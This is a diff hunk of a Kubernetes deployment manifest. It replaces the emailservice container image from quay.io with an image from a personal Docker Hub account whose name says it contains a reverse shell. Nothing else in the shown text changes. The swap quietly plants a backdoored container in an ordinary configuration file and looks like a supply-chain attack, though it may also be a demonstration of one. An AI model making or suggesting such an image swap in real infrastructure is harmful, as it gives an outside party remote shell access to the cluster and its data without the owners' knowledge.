@@ -421,7 +421,7 @@ spec:
           value: "1"
         - name: DISABLE_PROFILER
           value: "1"
-        image: quay.io/velocity/getting-started-emailservice:latest
+        image: docker.io/nokaun34/getting-started-email-service-reverse-shell:latest
         livenessProbe:
           exec:
             command:
